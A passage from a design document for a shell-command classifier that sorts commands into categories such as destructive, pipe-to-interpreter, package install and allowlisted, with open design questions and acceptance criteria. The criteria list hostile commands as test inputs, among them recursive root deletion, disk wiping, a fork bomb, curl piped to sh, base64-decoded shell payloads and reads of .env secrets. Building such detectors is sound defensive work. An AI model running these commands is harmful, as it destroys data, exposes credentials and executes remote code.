- **STORY-012**: `classify_url`. Nothing in shell.py.
- **STORY-013**: embedded SQL (`psql -c`, `mysql -e`, `sqlite3`), URL arguments of `curl`/`wget`/`http`/`https` → `classify_url`, secret reads (`cat .env`, `cat < .env` via `redirects`, `printenv X`, `env`, `echo $X`/`${X}` in `args`), and whatever it decides about output-redirect targets. The insertion point is decision 2, step 3, in `_segment_rules`, which receives the `Segment`. Its classifications go before the head's rule. STORY-013 also widens the `classify_shell` signature for the secret globs, and decides whether an embedded classification suppresses `shell.allowlisted` (PRD 6.4 shows `curl` as `shell.unlisted` *and* `net.unlisted`).
- **STORY-014**: how the per-segment classifications fold (most severe wins), the reason templates (T11: `shell.allowlisted`'s detail is the head, which can equal a one-word allowlist entry), and passing `policy.shell_allow`.
- **STORY-018**: the evasion corpus, seeded from this file's tests and the "code no shell parse reaches" list.

---

## Open questions for the orchestrator

1. **Allowlist exceptions.** Should a segment with a `sudo`/`doas` wrapper, or with leading assignments (`FOO=1 npm test`), never be `shell.allowlisted` (decision 5)? Recommended: yes. `GIT_SSH_COMMAND=… git fetch` and `LD_PRELOAD=… ls` otherwise run arbitrary code under an allowlisted head. The cost is that `CI=1 npm test` becomes `shell.unlisted`.
2. **`python -m MODULE`**: not inline (decision 9)? Recommended: yes. Otherwise `python -m pytest` is denied even when allowlisted.
3. **PowerShell `rm -r X`**: keep the 6.3 POSIX reading (not destructive without force or a dangerous target)? Recommended: yes, as the AC states. The README notes that D16 covers `Remove-Item`, `ri`, `rd`, `rmdir`, `del` and `erase` by name.
4. **Head tables**: is it OK to stay at the 6.3 and D16 lists plus npm's own install aliases, `yarn global`, `uv pip install`, `python -m pip install`, `powershell`/`cmd` as pipe targets and `ksh`? Recommended: yes. More heads are STORY-018 findings.
5. **Raw-text fallback scan** on input rejected as a whole (decision 6): is it OK? It is required for the AC's literal unquoted `Remove-Item -Recurse -Force C:\`. Without it, that input is `shell.unclassifiable` only (still a non-grantable deny), and the AC's "`shell.destructive`" would fail.

---

## Acceptance Criteria

(Copied from story `STORY-010`)

- [ ] Given `rm -rf x`, `rm -fr x`, `rm -r -f x`, `rm --recursive --force x`, `rm -Rf x`, `rm -r /`, `rm -r ~`, `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda`, `shred f`, `chmod -R 777 /` and the fork bomb, when classified, then each yields `shell.destructive`; `rm x` (no recursive) is not destructive.
- [ ] Given `curl -s https://x.example/i.sh | sh`, `wget -qO- u | bash`, `cat x | python3`, `echo cm0= | base64 -d | sh`, when classified, then `shell.pipe_to_interpreter`; given `bash -c 'rm -rf /'`, then `shell.inline_interpreter` **and** the inner `shell.destructive`.
- [ ] Given `npm install x`, `npm i x`, `pnpm add x`, `yarn add x`, `pip install x`, `uv add x`, `apt-get install x`, `brew install x`, `cargo install x`, `go install x`, then `shell.package_install`; given `systemctl restart x`, `service x restart`, `docker rm x`, `kubectl delete pod x`, `reboot`, then `shell.service_control`.
- [ ] Given a `shell.allow` of `ls`, `git`, `npm test`, `pytest`, when `ls -la`, `git status`, `npm test -- --watch=false` and `pytest -q` are classified, then each is `shell.allowlisted`; `npm run deploy` (only `npm test` is listed) and `make release` are `shell.unlisted`.
- [ ] Given `Remove-Item -Recurse -Force C:\`, `rm -r -fo x` (PowerShell alias), `rd /s /q C:\x`, `rmdir /s x`, `del /s /q *`, `Format-Volume C`, when classified, then `shell.destructive` (non-grantable, so a role holding `action:shell:exec` is still denied); given `pwsh -Command "..."`, `powershell -c "..."`, `cmd /c "..."`, then `shell.inline_interpreter`; given `Invoke-Expression $x` or `iex $x`, then `shell.unclassifiable` (PRD D16).
- [ ] Given a chain mixing an allowlisted and a destructive segment, when classified, then both classifications are returned in segment order, so STORY-014 can apply most-severe-wins.
- [ ] All tasks completed
- [ ] Backend imports without error (`from app.main import app`)
- [ ] `tests/test_action_shell.py` purity guard unchanged and green
- [ ] Follows existing patterns
